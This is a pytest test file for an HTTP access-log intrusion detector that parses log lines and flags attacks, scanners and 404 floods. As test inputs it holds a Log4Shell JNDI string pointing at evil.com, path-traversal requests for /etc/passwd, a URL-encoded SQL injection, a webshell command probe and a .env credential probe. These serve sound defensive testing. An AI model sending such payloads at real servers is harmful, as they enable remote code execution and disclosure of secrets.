import pytest
from defensewatch.parsers.http import (
    parse_http_line, detect_attacks, detect_scanner, HTTPScanTracker,
)
from defensewatch.config import DetectionConfig


class TestParseHTTPLine:
    def _make_line(self, ip="1.2.3.4", method="GET", path="/", status=200,
                   ua="Mozilla/5.0"):
        return (
            f'{ip} - - [03/Mar/2026:17:52:00 +0100] '
            f'"{method} {path} HTTP/1.1" {status} 1234 "-" "{ua}"'
        )

    def test_basic_parse(self):
        event = parse_http_line(self._make_line())
        assert event is not None
        assert event.source_ip == "1.2.3.4"
        assert event.method == "GET"
        assert event.path == "/"
        assert event.status_code == 200

    def test_attack_detection(self):
        event = parse_http_line(self._make_line(path="/etc/passwd"))
        assert event is not None
        assert "path_traversal" in event.attack_types
        assert event.severity == "high"

    def test_scanner_detection(self):
        event = parse_http_line(self._make_line(ua="Nikto/2.1.6"))
        assert event is not None
        assert event.scanner_name == "nikto"
        assert "scanner" in event.attack_types

    def test_sqli_detection(self):
        # Single quotes in the path break nginx combined log format parsing,
        # so test with URL-encoded quote (%27) which the regex does match
        event = parse_http_line(self._make_line(path="/page?id=1%27%20OR%201=1"))
        assert event is not None
        assert "sqli" in event.attack_types
        assert event.severity == "critical"

    def test_method_anomaly(self):
        event = parse_http_line(self._make_line(method="PROPFIND", path="/"))
        assert event is not None
        assert "method_anomaly" in event.attack_types

    def test_vhost_passthrough(self):
        event = parse_http_line(self._make_line(path="/../etc/passwd"), vhost="example.com")
        assert event is not None
        assert event.vhost == "example.com"

    def test_empty_line(self):
        assert parse_http_line("") is None
        assert parse_http_line("   ") is None

    def test_malformed_line(self):
        assert parse_http_line("not a log line at all") is None

    def test_normal_traffic_no_attack(self):
        event = parse_http_line(self._make_line(path="/index.html", ua="Mozilla/5.0"))
        assert event is not None
        assert event.attack_types == []


class TestDetectAttacks:
    def test_log4shell(self):
        types, sev = detect_attacks("/test", user_agent="${jndi:ldap://evil.com/a}")
        assert "log4shell" in types
        assert sev == "critical"

    def test_webshell(self):
        types, sev = detect_attacks("/shell.php?cmd=ls")
        assert "webshell" in types
        assert sev == "critical"

    def test_credential_probe(self):
        types, sev = detect_attacks("/.env")
        assert "credential_probe" in types
        assert sev == "high"

    def test_cms_probe(self):
        types, sev = detect_attacks("/wp-login.php")
        assert "cms_probe" in types
        assert sev == "medium"

    def test_method_anomaly(self):
        types, sev = detect_attacks("/", method="TRACE")
        assert "method_anomaly" in types

    def test_encoding_obfuscation(self):
        types, sev = detect_attacks("/..%252f..%252fetc/passwd")
        assert "encoding_obfuscation" in types

    def test_no_attack(self):
        types, sev = detect_attacks("/index.html")
        assert types == []
        assert sev is None


class TestDetectScanner:
    def test_known_scanners(self):
        assert detect_scanner("Nikto/2.1.6") == "nikto"
        assert detect_scanner("sqlmap/1.5") == "sqlmap"
        assert detect_scanner("Mozilla/5.0 zgrab/0.x") == "zgrab"

    def test_no_scanner(self):
        assert detect_scanner("Mozilla/5.0 (X11; Linux)") is None


class TestHTTPScanTracker:
    def test_no_alert_below_threshold(self):
        config = DetectionConfig(http_scan_threshold=5, http_scan_window_seconds=60)
        tracker = HTTPScanTracker(config)
        for i in range(4):
            assert tracker.track("1.2.3.4", 404, 1000.0 + i) is False

    def test_alert_at_threshold(self):
        config = DetectionConfig(http_scan_threshold=5, http_scan_window_seconds=60)
        tracker = HTTPScanTracker(config)
        for i in range(4):
            tracker.track("1.2.3.4", 404, 1000.0 + i)
        assert tracker.track("1.2.3.4", 404, 1005.0) is True

    def test_ignores_non_404(self):
        config = DetectionConfig(http_scan_threshold=5, http_scan_window_seconds=60)
        tracker = HTTPScanTracker(config)
        for i in range(10):
            assert tracker.track("1.2.3.4", 200, 1000.0 + i) is False

    def test_window_expiry(self):
        config = DetectionConfig(http_scan_threshold=5, http_scan_window_seconds=60)
        tracker = HTTPScanTracker(config)
        for i in range(4):
            tracker.track("1.2.3.4", 404, 1000.0 + i)
        # Past window
        assert tracker.track("1.2.3.4", 404, 1100.0) is False
